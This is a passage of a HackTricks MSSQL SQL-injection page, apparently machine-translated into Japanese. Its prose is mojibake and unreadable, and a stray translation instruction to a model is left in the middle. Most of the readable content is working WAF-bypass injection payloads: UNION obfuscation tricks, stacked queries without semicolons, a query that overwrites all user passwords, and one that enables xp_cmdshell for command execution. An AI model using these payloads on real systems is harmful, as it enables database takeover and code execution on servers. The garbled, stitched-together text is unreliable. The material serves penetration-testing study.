**æ¨©é™:** ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚µãƒ¼ãƒãƒ¼ä¸Šã§VIEW SERVER STATEæ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯SQL Serverã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ä¸Šã§å®Ÿè¡Œä¸­ã®ã™ã¹ã¦ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ãã‚Œä»¥å¤–ã®å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ç¾åœ¨ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®ã¿ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
## **WAFãƒã‚¤ãƒ‘ã‚¹ã®ãŸã‚ã®å°æŠ€**

éæ¨™æº–ã®ç©ºç™½æ–‡å­—: %C2%85ã¾ãŸã¯%C2%A0:
```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
UNIONã‚’æ›–æ˜§åŒ–ã™ã‚‹ãŸã‚ã®ç§‘å­¦çš„ï¼ˆ0eï¼‰ãŠã‚ˆã³16é€²ï¼ˆ0xï¼‰è¡¨è¨˜æ³•ï¼š
```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
FROMã¨åˆ—åã®é–“ã«ã¯ã€ã‚¹ãƒšãƒ¼ã‚¹ã®ä»£ã‚ã‚Šã«ãƒ”ãƒªã‚ªãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
SELECTã¨ä½¿ã„æ¨ã¦ã®ã‚«ãƒ©ãƒ ã®é–“ã®\Nã‚»ãƒ‘ãƒ¬ãƒ¼ã‚¿ãƒ¼ï¼š
```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
### WAFãƒã‚¤ãƒ‘ã‚¹ã¨éä¼çµ±çš„ãªã‚¹ã‚¿ãƒƒã‚¯ã‚¯ã‚¨ãƒª

[**ã“ã®ãƒ–ãƒ­ã‚°è¨˜äº‹**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)ã«ã‚ˆã‚‹ã¨ã€MSSQLã§ã¯";"ã‚’ä½¿ç”¨ã›ãšã«ã‚¯ã‚¨ãƒªã‚’ã‚¹ã‚¿ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

ä¾‹ãˆã°ã€è¤‡æ•°ã®ã‚¯ã‚¨ãƒªã‚’ä»¥ä¸‹ã®ã‚ˆã†ã«ã‚¹ã‚¿ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
ä»¥ä¸‹ã¯ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«é–¢ã™ã‚‹ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã«ã¤ã„ã¦ã®æœ¬ã®å†…å®¹ã§ã™ã€‚æ¬¡ã®å†…å®¹ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«pentesting-web/sql-injection/mssql-injection.mdã‹ã‚‰ã®ã‚‚ã®ã§ã™ã€‚é–¢é€£ã™ã‚‹è‹±æ–‡ã‚’æ—¥æœ¬èªã«ç¿»è¨³ã—ã€ç¿»è¨³ã‚’ä¿æŒã—ãŸã¾ã¾ã€åŒã˜ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ãŠã‚ˆã³HTMLã®æ§‹æ–‡ã‚’è¿”ã—ã¦ãã ã•ã„ã€‚ã‚³ãƒ¼ãƒ‰ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã®åå‰ã€ãƒãƒƒã‚­ãƒ³ã‚°ç”¨èªã€ã‚¯ãƒ©ã‚¦ãƒ‰/SaaSãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®åå‰ï¼ˆWorkspaceã€awsã€gcpãªã©ï¼‰ã€"leak"ã¨ã„ã†å˜èªã€ãƒšãƒ³ãƒ†ã‚¹ãƒˆã€ãŠã‚ˆã³ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã‚¿ã‚°ãªã©ã¯ç¿»è¨³ã—ãªã„ã§ãã ã•ã„ã€‚ã¾ãŸã€ç¿»è¨³ã¨ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã®æ§‹æ–‡ä»¥å¤–ã®è¿½åŠ ã®å†…å®¹ã¯è¿½åŠ ã—ãªã„ã§ãã ã•ã„ã€‚
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
ã—ãŸãŒã£ã¦ã€ã“ã®ç¨®ã®ã‚¯ã‚¨ãƒªã®ã‚¹ã‚¿ãƒƒã‚¯ã‚’è€ƒæ…®ã—ãªã„ã•ã¾ã–ã¾ãªWAFã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ä¾‹ãˆã°ï¼š
```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```
## å‚è€ƒæ–‡çŒ®

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
